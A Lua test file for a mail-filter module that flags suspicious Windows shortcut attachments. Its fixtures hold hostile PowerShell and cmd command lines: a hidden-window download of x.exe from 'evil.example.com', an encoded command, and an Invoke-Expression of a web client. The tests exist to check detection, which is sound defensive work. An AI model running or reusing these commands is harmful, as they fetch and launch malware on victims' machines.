-- Windows Shortcut (.lnk) heuristics (lua_content/lnk)

context("LNK attachment heuristics", function()
  local rspamd_task = require "rspamd_task"
  local lnk = require "lua_content/lnk"

  local hdrs = "From: <>\nTo: <nobody@example.com>\nSubject: test\n"

  local LNK_MAGIC = "\x4C\x00\x00\x00"
      .. "\x01\x14\x02\x00\x00\x00\x00\x00\xC0\x00\x00\x00\x00\x00\x00\x46"

  local LF_HAS_ARGUMENTS = 0x00000020

  local function get_task()
    local _res, task = rspamd_task.load_from_string(hdrs .. "\n", rspamd_config)
    task:process_message()
    return task
  end

  local function u16le(n)
    return string.char(n % 256, math.floor(n / 256) % 256)
  end

  local function u32le(n)
    return string.char(n % 256, math.floor(n / 256) % 256,
        math.floor(n / 65536) % 256, math.floor(n / 16777216) % 256)
  end

  -- Build a minimal, valid 76-byte LNK header with the given LinkFlags,
  -- followed by an (ANSI, non-unicode) COMMAND_LINE_ARGUMENTS StringData
  -- section only (no IDList/LinkInfo/other string sections).
  local function make_lnk(args)
    local header = LNK_MAGIC .. u32le(LF_HAS_ARGUMENTS)
    header = header .. string.rep("\0", 76 - #header)
    assert(#header == 76)
    local args_section = u16le(#args) .. args
    return header .. args_section
  end

  test("non-LNK input returns nil", function()
    local task = get_task()
    local res = lnk.process("not a shortcut file", nil, task)
    assert_nil(res)
    task:destroy()
  end)

  test("clean arguments produce no flags", function()
    local task = get_task()
    local input = make_lnk("/C notepad.exe readme.txt")
    local res = lnk.process(input, nil, task)
    assert_not_nil(res)
    assert_equal(res.tag, 'lnk')
    assert_equal(res.arguments, "/C notepad.exe readme.txt")
    assert_false(res.has_encoded_cmd)
    task:destroy()
  end)

  test("detects LOLBin invocation and encoded PowerShell command", function()
    local task = get_task()
    local input = make_lnk(
      "powershell.exe -EncodedCommand aGVsbG8gd29ybGQgZXZpbCBjb2RlIGhlcmU=")
    local res = lnk.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.has_lolbin)
    assert_true(res.has_encoded_cmd)
    assert_true(res.has_suspicious_args)
    task:destroy()
  end)

  test("detects hidden window style, download primitive and remote URL", function()
    local task = get_task()
    local input = make_lnk(
      "powershell.exe -WindowStyle Hidden -Command (New-Object Net.WebClient).DownloadFile('http://evil.example.com/x','x.exe')")
    local res = lnk.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.has_hidden)
    assert_true(res.has_download)
    assert_true(res.has_remote_url)
    task:destroy()
  end)

  test("flags long argument strings", function()
    local task = get_task()
    local input = make_lnk("cmd.exe /c " .. string.rep("A", 250))
    local res = lnk.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.has_long_args)
    task:destroy()
  end)

  -- Regression: the shell does not care about case, so neither may the
  -- argument patterns. "CMD /C" previously slipped past a pattern that was
  -- case-insensitive only for the switch letter.
  test("detects uppercase CMD /C", function()
    local task = get_task()
    local input = make_lnk("CMD /C powershell -w hidden -nop")
    local res = lnk.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.has_suspicious_args)
    task:destroy()
  end)

  test("detects mixed-case Invoke-Expression", function()
    local task = get_task()
    local input = make_lnk("-command INVOKE-EXPRESSION (New-Object Net.WebClient)")
    local res = lnk.process(input, nil, task)
    assert_not_nil(res)
    assert_true(res.has_suspicious_args)
    task:destroy()
  end)
end)
